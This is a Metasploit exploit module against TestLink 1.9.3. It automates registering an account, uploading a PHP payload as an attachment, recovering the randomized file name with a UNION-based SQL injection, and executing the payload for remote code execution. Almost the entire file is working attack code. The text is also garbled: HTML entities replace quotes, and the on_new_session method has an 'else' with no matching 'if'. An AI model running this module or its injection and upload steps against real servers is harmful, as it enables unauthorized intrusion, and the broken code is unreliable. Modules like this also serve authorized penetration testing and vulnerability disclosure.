# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "TestLink v1.9.3 Arbitrary File Upload Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in TestLink version 1.9.3 or prior.
        This application has an upload feature that allows any authenticated
        user to upload arbitrary files to the &#039;/upload_area/nodes_hierarchy/&#039;
        directory with a randomized file name. The file name can be retrieved from
        the database using SQL injection.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Discovery and exploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://itsecuritysolutions.org/2012-08-13-TestLink-1.9.3-multiple-vulnerabilities/&#039;]
          #[&#039;OSVDB&#039;, &#039;&#039;],
          #[&#039;EDB&#039;,   &#039;&#039;],
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00"
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "none"
        },
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Aug 13 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the web application&#039;, &#039;/testlink-1.9.3/&#039;])
      ], self.class)
  end

  def check

    base  = target_uri.path
    base << &#039;/&#039; if base[-1, 1] != &#039;/&#039;
    peer = "#{rhost}:#{rport}"

    # retrieve software version from login page
    begin
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => "#{base}login.php"
      })

      return Exploit::CheckCode::Unknown if res.nil?
      return Exploit::CheckCode::Vulnerable if res and res.code == 200 and res.body =~ /<p><img alt="Company logo" title="logo" style="width: 115px; height: 53px;"\s+src="[^"]+" \/>\s+<br \/>TestLink 1\.9\.3/
      return Exploit::CheckCode::Detected if res and res.body =~ /TestLink project <a href="http:\/\/testlink\.sourceforge\.net\/docs\/testLink\.php">Home<\/a><br \/>/
      return Exploit::CheckCode::Safe
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error("#{peer} - Connection failed")
    end
    return Exploit::CheckCode::Unknown

  end

  def upload(base, fname, file)

    boundary = "----WebKitFormBoundary#{rand_text_alphanumeric(10)}"
    data_post  = "--#{boundary}\r\n"
    data_post << "Content-Disposition: form-data; name=\"uploadedFile\"; filename=\"#{fname}\"\r\n"
    data_post << "Content-Type: text/php\r\n"
    data_post << "\r\n"
    data_post << file
    data_post << "\r\n"
    data_post << "--#{boundary}\r\n"
    data_post << "Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n"
    data_post << "\r\n1048576\r\n"
    data_post << "--#{boundary}\r\n"

    res = send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => "#{base}lib/attachments/attachmentupload.php",
      &#039;ctype&#039;   => "multipart/form-data; boundary=#{boundary}",
      &#039;data&#039;    => data_post,
      &#039;cookie&#039;  => datastore[&#039;COOKIE&#039;],
    })

    return res
  end

  def register(base, user, pass)

    res   = send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => "#{base}firstLogin.php",
      &#039;data&#039;    => "login=#{user}&password=#{pass}&password2=#{pass}&firstName=#{user}&lastName=#{user}&email=#{user}%40#{user}.tld&doEditUser=Add+User+Data",
    })

    return res

  end

  def login(base, user, pass)

    res   = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => "#{base}login.php",
      &#039;data&#039;   => "reqURI=&destination=&tl_login=#{user}&tl_password=#{pass}&login_submit=Login",
      &#039;cookie&#039; => datastore[&#039;COOKIE&#039;],
    })

    return res

  end

  def on_new_session(client)
      client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
      client.fs.file.rm("#{@token}.php")
    else
      client.shell_command_token("rm #{@token}.php")
    end
  end


  def exploit

    base  = target_uri.path
    base << &#039;/&#039; if base[-1, 1] != &#039;/&#039;
    @peer = "#{rhost}:#{rport}"
    datastore[&#039;COOKIE&#039;] = "PHPSESSID="+rand_text_alpha_lower(26)+";"

    # register an account
    user  = rand_text_alphanumeric(rand(10)+6)
    print_status("#{@peer} - Registering user (#{user})")
    res   = register(base, user, user)
    if res and res.code == 200 and res.body =~ /\<html\>\<head\>\<\/head\>\<body\>\<script type=&#039;text\/javascript&#039;\>location\.href=/
      print_status("#{@peer} - Registered successfully")
    else
      print_error("#{@peer} - Registration failed")
      return
    end

    # login
    print_status("#{@peer} - Authenticating user (#{user})")
    res   = login(base, user, user)
    if res and res.code == 200 and res.body =~ /\<html\>\<head\>\<\/head\>\<body\>\<script type=&#039;text\/javascript&#039;\>location\.href=/
      print_status("#{@peer} - Authenticated successfully")
    else
      print_error("#{@peer} - Authentication failed")
      return
    end

    # set id and table name
    id    = rand(1000)+1
    table = &#039;nodes_hierarchy&#039;
    print_status("#{@peer} - Setting id (#{id}) and table name (#{table})")
    begin
      res = send_request_cgi({
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;uri&#039;     => "#{base}lib/attachments/attachmentupload.php?id=#{id}&tableName=#{table}",
        &#039;cookie&#039; => datastore[&#039;COOKIE&#039;],
      })
      if res and res.code == 200
        print_status("#{@peer} - Setting id and table name successfully")
      else
        print_error("#{@peer} - Setting id and table name failed")
        return
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error("#{@peer} - Connection failed")
      return
    end

    # upload PHP payload to ./upload_area/nodes_hierarchy/[id]/
    print_status("#{@peer} - Uploading PHP payload (#{payload.encoded.length.to_s} bytes)")
    fname  = rand_text_alphanumeric(rand(10)+6) + &#039;.php&#039;
    php    = %Q|<?php #{payload.encoded} ?>|
    begin
      res    = upload(base, fname, php)
      if res and res.code == 200 and res.body =~ /<p>File uploaded<\/p>/
        print_good("#{@peer} - File uploaded successfully")
      else
        print_error("#{@peer} - Uploading PHP payload failed")
        return
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error("#{@peer} - Connection failed")
      return
    end

    # attempt to retrieve real file name from directory index
    print_status("#{@peer} - Retrieving real file name from directory index.")
    begin
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => "#{base}upload_area/#{table}/#{id}/"
      })
      if res and res.code == 200 and res.body =~ /\b([a-f0-9]+)\.php/
        @token = $1
        print_good("#{@peer} - Successfully retrieved file name (#{@token})")
      else
        print_error("#{@peer} - Could not retrieve file name from directory index.")
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error("#{@peer} - Connection failed")
      return
    end

    # attempt to retrieve real file name from the database
    if @token.nil?
      print_status("#{@peer} - Retrieving real file name from the database.")
      sqli = "lib/ajax/gettprojectnodes.php?root_node=-1+union+select+file_path,2,3,4,5,6+FROM+attachments+WHERE+file_name=&#039;#{fname}&#039;--"
      begin
        res = send_request_cgi({
          &#039;method&#039; => &#039;GET&#039;,
          &#039;uri&#039;    => "#{base}#{sqli}",
          &#039;cookie&#039; => datastore[&#039;COOKIE&#039;],
        })
        if res and res.code == 200 and res.body =~ /\b([a-f0-9]+)\.php/
          @token = $1
          print_good("#{@peer} - Successfully retrieved file name (#{@token})")
        else
          print_error("#{@peer} - Could not retrieve file name from the database.")
          return
        end
      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
        print_error("#{@peer} - Connection failed")
        return
      end
    end

    # retrieve and execute PHP payload
    print_status("#{@peer} - Executing payload (#{@token}.php)")
    begin
      send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => "#{base}upload_area/nodes_hierarchy/#{id}/#{@token}.php"
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error("#{@peer} - Connection failed")
      return
    end

    handler
  end
end



